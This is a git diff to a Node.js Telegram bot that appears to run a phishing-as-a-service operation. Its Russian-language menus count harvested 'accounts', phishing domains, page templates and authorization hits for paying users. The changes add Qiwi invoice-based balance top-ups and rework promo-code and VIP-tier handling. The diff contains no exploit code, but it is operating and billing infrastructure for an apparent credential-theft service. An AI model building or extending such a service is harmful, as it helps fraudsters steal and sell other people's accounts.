@@ -1,11 +1,14 @@
 const bot = require('./createBot')
+const qiwiApi = require('./qiwiApi')
 const adminCommands = require('./adminCommands')
 const promocode = require('./database/models/promo')
 const data = require('./database/models/userData')
 const account = require('./database/models/account')
 const link = require('./database/models/link')
 const isAuth = require('./middleware/AuthCheck')
+const axios = require('axios');
 const {
+    ISODATE,
     GetStringDate,
     GetDaysCount,
     VipCheck
@@ -91,7 +94,9 @@ bot.onText(/👤 Мой профиль/, async (msg) => {
                     authVist++
                 }
             })
-            await bot.sendMessage(msg.chat.id, `👤 Мой профиль\n\n🆔 ID: <code>${msg.chat.id}</code>\n🎗 Статус: ${admin}\n\n💸 Баланс: ${user.balance}₽\n\n☘️ Аккаунтов за сегодня: ${today}\n☘️ Аккаунтов за неделю: ${week}\n☘️ Аккаунтов за месяц: ${month}\n☘️ Аккаунтов за всё время: ${accounts.length}\n\n👀 Переходов за всё время: ${accounts.length}\n🔐 Переходов на авторизацию за всё время: ${accounts.length}`, {
+           
+            await bot.sendPhoto(msg.chat.id, 'https://i.imgur.com/lmVewrH.jpegє', {
+                caption: `👤 Мой профиль\n\n🆔 ID: <code>${msg.chat.id}</code>\n🎗 Статус: ${admin}\n\n💸 Баланс: ${user.balance}₽\n\n☘️ Аккаунтов за сегодня: ${today}\n☘️ Аккаунтов за неделю: ${week}\n☘️ Аккаунтов за месяц: ${month}\n☘️ Аккаунтов за всё время: ${accounts.length}\n\n👀 Переходов за всё время: ${accounts.length}\n🔐 Переходов на авторизацию за всё время: ${accounts.length}`,
                 parse_mode: 'HTML'
             })
         } else {
@@ -271,7 +276,7 @@ bot.onText(/📊 О боте/, async (msg) => {
                     accs_month++
                 }
             })
-                bot.sendMessage(msg.chat.id, `📊 Статистика\n\n😻Регистраций в боте за сегодня: ${reg_today||0}\n😻Регистраций в боте за неделю: ${reg_week||0}\n😻Регистраций в боте за месяц: ${reg_month||0}\n😻Регистраций в боте за все время: ${reg_alltime||0}\n\n👨‍👩‍👧‍👦 Подписчиков в Новостях: ${await bot.getChatMemberCount('@ssniffer').catch(err => console.log(err))}\n👨‍👩‍👧‍👦 Подписчиков в Чате: ${await bot.getChatMemberCount('@sniffer_chat').catch(err => console.log(err))}\n👨‍👩‍👧‍👦 Подписчиков в Отзывах: ${await bot.getChatMemberCount('@ssniffero').catch(err => console.log(err))}\n\n📎 Количество доменов: ${sites||0}\n📁 Количество шаблонов: ${pattern||0}\n\n🍀 Аккаунтов за сегодня: ${accs_today||0}\n🍀 Аккаунтов за неделю: ${accs_week||0}\n🍀 Аккаунтов за месяц: ${accs_month||0}\n🍀 Аккаунтов за все время: ${accs_alltime||0}\n\n👑 Пользователи [⛏Рабочий]: ${vip_1||0}\n👑 Пользователи [🤴🏻Любитель]: ${vip_2||0}\n👑 Пользователи [🥷Профи]: ${vip_3||0}\n👑 Пользователи [👀Предпрениматель]: ${vip_4||0}\n\n📅 Мы работаем с 2021 года.`, {
+                bot.sendMessage(msg.chat.id, `📊 Статистика\n\n😻Регистраций в боте за сегодня: ${reg_today||0}\n😻Регистраций в боте за неделю: ${reg_week||0}\n😻Регистраций в боте за месяц: ${reg_month||0}\n😻Регистраций в боте за все время: ${reg_alltime||0}\n\n👨‍👩‍👧‍👦 Подписчиков в Новостях: ${await bot.getChatMemberCount('@ssniffer').catch(err => console.log(err))}\n👨‍👩‍👧‍👦 Подписчиков в Чате: ${await bot.getChatMemberCount('@sniffer_chat').catch(err => console.log(err))}\n👨‍👩‍👧‍👦 Подписчиков в Отзывах: ${await bot.getChatMemberCount('@ssniffero').catch(err => console.log(err))}\n\n📎 Количество доменов: ${sites||0}\n📁 Количество шаблонов: ${pattern||0}\n\n🍀 Аккаунтов за сегодня: ${accs_today||0}\n🍀 Аккаунтов за неделю: ${accs_week||0}\n🍀 Аккаунтов за месяц: ${accs_month||0}\n🍀 Аккаунтов за все время: ${accs_alltime||0}\n\n👑 Пользователи [🥳 Новичок]: ${vip_1||0}\n👑 Пользователи [🤴🏻 Любитель]: ${vip_2||0}\n👑 Пользователи [🥷🏻 Профи]: ${vip_3||0}\n👑 Пользователи [🥰 Любимчик]: ${vip_4||0}\n\n📅 Мы работаем с 2021 года.`, {
                     parse_mode: 'HTML'
                 })
             }else{
@@ -386,7 +391,7 @@ bot.onText(/💸 Пополнение/, async (msg) => {
                 inline_keyboard: [
                     [{
                         text: '💰Пополнить Баланс',
-                        url: 'https://t.me/VinciCash_S'
+                        callback_data: 'ShowPayMenu'
                     }],
                     [{
                         text: '🗂 История транзакций',
@@ -459,72 +464,85 @@ bot.on('message', async (msg) => {
         })
         if (user.edit_mode) {
             if (!menuList.includes(msg.text)) {
-                await promocode.findOne({
-                    promo: msg.text
-                }).then(async e => {
-                    if (e) {
-                        let usedBy = e.usedBy,
-                            used = false
-                        usedBy.map(i => {
-                            if (i.tg_id == msg.chat.id) {
-                                used = true
-                            }
-                        })
-                        if (e.activations < e.mactivation && !used) {
-                            usedBy.push({
-                                tg_id: msg.chat.id,
-                                login: msg.chat.username,
-                                date: new Date()
+                if(user.edit_modeType == 'promo'){
+                    await promocode.findOne({
+                        promo: msg.text
+                    }).then(async e => {
+                        if (e) {
+                            let usedBy = e.usedBy,
+                                used = false
+                            usedBy.map(i => {
+                                if (i.tg_id == msg.chat.id) {
+                                    used = true
+                                }
                             })
-                            if (e.type == 'balance') {
-                                await data.updateOne({
-                                    tg_id: msg.chat.id
-                                }, {
-                                    balance: user.balance + Number(e.value),
-                                    transactions: [...user.transactions, {
-                                        type: 'Промокод',
-                                        value: '+' + e.value,
-                                        date: new Date()
-                                    }]
-                                }, {
-                                    upsert: true
+                            if (e.activations < e.mactivation && !used) {
+                                usedBy.push({
+                                    tg_id: msg.chat.id,
+                                    login: msg.chat.username,
+                                    date: new Date()
                                 })
-                            } else {
-                                let date = new Date()
-                                date.setHours(date.getHours() + Number(e.value))
-                                await data.updateOne({
-                                    tg_id: msg.chat.id
-                                }, {
-                                    vip: true,
-                                    vipDate: date,
-                                    vipType: 1,
-                                }, {
-                                    upsert: true
-                                })
-                            }
-
-                            await promocode.updateOne({
-                                promo: msg.text
-                            }, {
-                                activations: e.activations + 1,
-                                usedBy: usedBy
-                            }, {
-                                upsert: true
-                            }).then((data2) => {
-                                if (data2) {
-                                    bot.sendMessage(msg.chat.id, `✅ Промокод ${msg.text} успешно активирован, ${e.type =='balance'?'вам зачислено на баланс '+e.value+' RUB': 'Вы получили '+e.value+' часов VIP статуса'}`, {}).then(async it => {
-                                        const x = await data.updateOne({
-                                            tg_id: msg.chat.id
-                                        }, {
-                                            edit_mode: false,
-                                            edit_modeType: ''
-                                        }, {
-                                            upsert: true
-                                        })
+                                if (e.type == 'balance') {
+                                    await data.updateOne({
+                                        tg_id: msg.chat.id
+                                    }, {
+                                        balance: user.balance + Number(e.value),
+                                        transactions: [...user.transactions, {
+                                            type: 'Промокод',
+                                            value: '+' + e.value,
+                                            date: new Date()
+                                        }]
+                                    }, {
+                                        upsert: true
+                                    })
+                                } else {
+                                    let date = new Date()
+                                    date.setHours(date.getHours() + Number(e.value))
+                                    await data.updateOne({
+                                        tg_id: msg.chat.id
+                                    }, {
+                                        vip: true,
+                                        vipDate: date,
+                                        vipType: 1,
+                                    }, {
+                                        upsert: true
                                     })
                                 }
-                            }).catch(err => {
-                                bot.sendMessage(msg.chat.id, `❌ Что-то пошло не так 😥, попробуйте позже\n\n🚪Для выхода из режима ввода нажмите кнопку ниже`, {
+    
+                                await promocode.updateOne({
+                                    promo: msg.text
+                                }, {
+                                    activations: e.activations + 1,
+                                    usedBy: usedBy
+                                }, {
+                                    upsert: true
+                                }).then((data2) => {
+                                    if (data2) {
+                                        bot.sendMessage(msg.chat.id, `✅ Промокод ${msg.text} успешно активирован, ${e.type =='balance'?'вам зачислено на баланс '+e.value+' RUB': 'Вы получили '+e.value+' часов VIP статуса'}`, {}).then(async it => {
+                                            const x = await data.updateOne({
+                                                tg_id: msg.chat.id
+                                            }, {
+                                                edit_mode: false,
+                                                edit_modeType: ''
+                                            }, {
+                                                upsert: true
+                                            })
+                                        })
+                                    }
+                                }).catch(err => {
+                                    bot.sendMessage(msg.chat.id, `⛔️ Что-то пошло не так 😥, попробуйте позже\n\n🚪Для выхода из режима ввода нажмите кнопку ниже`, {
+                                        reply_markup: {
+                                            inline_keyboard: [
+                                                [{
+                                                    text: '🚪 Выйти',
+                                                    callback_data: 'remove_editmode'
+                                                }]
+                                            ]
+                                        }
+                                    })
+                                });
+                            } else {
+                                bot.sendMessage(msg.chat.id, used ? `⛔️ Промо-код ${msg.text} уже использован вами ранее.` : `❌ Промо-код ${msg.text} уже использован максимальное количество раз.\n\n🚪Для выхода из режима ввода нажмите кнопку ниже`, {
                                     reply_markup: {
                                         inline_keyboard: [
                                             [{
@@ -534,9 +552,9 @@ bot.on('message', async (msg) => {
                                         ]
                                     }
                                 })
-                            });
+                            }
                         } else {
-                            bot.sendMessage(msg.chat.id, used ? `❌ Промо-код ${msg.text} уже использован вами ранее.` : `❌ Промо-код ${msg.text} уже использован максимальное количество раз.\n\n🚪Для выхода из режима ввода нажмите кнопку ниже`, {
+                            bot.sendMessage(msg.chat.id, `⛔️ Промо-код ${msg.text} не найден\n\n🚪Для выхода из режима ввода нажмите кнопку ниже "Выйти".`, {
                                 reply_markup: {
                                     inline_keyboard: [
                                         [{
@@ -547,19 +565,69 @@ bot.on('message', async (msg) => {
                                 }
                             })
                         }
-                    } else {
-                        bot.sendMessage(msg.chat.id, `❌ Промо-код ${msg.text} не найден\n\n🚪Для выхода из режима ввода нажмите кнопку ниже "Выйти".`, {
+                    })
+                }else if(user.edit_modeType == 'balance'){
+                    if(Number(msg.text) > 20){
+                        const billId = qiwiApi.generateId()
+                        await qiwiApi.createBill(billId, {
+                            amount: Number(msg.text),
+                            currency: 'RUB',
+                            expirationDateTime: qiwiApi.getLifetimeByDay(0.00347)
+                        })
+                        .then(async (link_obj)=>{
+                            bot.sendMessage(msg.chat.id, `💰Счет к оплате\n\n💸Вы хотите пополнить свой баланс на "${Number(msg.text)}"₽!\nДля того что бы перейти к пополнению нажмите  кнопку оплатить\n\nСтатус: <i>Ожидает оплаты</i>\n\n🕰Данная ссылка истекает через 5 минут`, {
+                                reply_markup:{
+                                    inline_keyboard: [
+                                       [{text: 'Оплатить 🔗', url: link_obj.payUrl},{text:'Проверить ✅', callback_data: 'checkPay_'+link_obj.billId}]
+                                    ]
+                                },
+                                parse_mode: 'HTML'
+                            }).then(async it => {
+                                const x = await data.updateOne({
+                                    tg_id: msg.chat.id
+                                }, {
+                                    edit_mode: false,
+                                    edit_modeType: ''
+                                }, {
+                                    upsert: true
+                                })
+                            })
+                        })
+                        .catch(async err=>{ 
+                            console.log(err.message)
+                            bot.sendMessage(msg.chat.id, `Что-то пошло не так :(. Попробуйте снова`)
+                            const x = await data.updateOne({
+                                tg_id: msg.chat.id
+                            }, {
+                                edit_mode: false,
+                                edit_modeType: ''
+                            }, {
+                                upsert: true
+                            })
+                        })
+                         
+                    }else{
+                        bot.sendMessage(msg.chat.id, `Сумма пополнения должна быть больше 20₽\n🚪Для выхода из режима ввода нажмите кнопку ниже "Выйти".`, { 
                             reply_markup: {
-                                inline_keyboard: [
-                                    [{
-                                        text: '🚪 Выйти',
-                                        callback_data: 'remove_editmode'
-                                    }]
-                                ]
-                            }
+                            inline_keyboard: [
+                                [{
+                                    text: '🚪 Выйти',
+                                    callback_data: 'remove_editmode'
+                                }]
+                            ]
+                        }}).then(async it => {
+                            const x = await data.updateOne({
+                                tg_id: msg.chat.id
+                            }, {
+                                edit_mode: false,
+                                edit_modeType: ''
+                            }, {
+                                upsert: true
+                            })
                         })
                     }
-                })
+                }
+                
             } else {
                 bot.sendMessage(msg.chat.id, `🚪 Для выхода из режима ввода нажмите кнопку ниже`, {
                     reply_markup: {
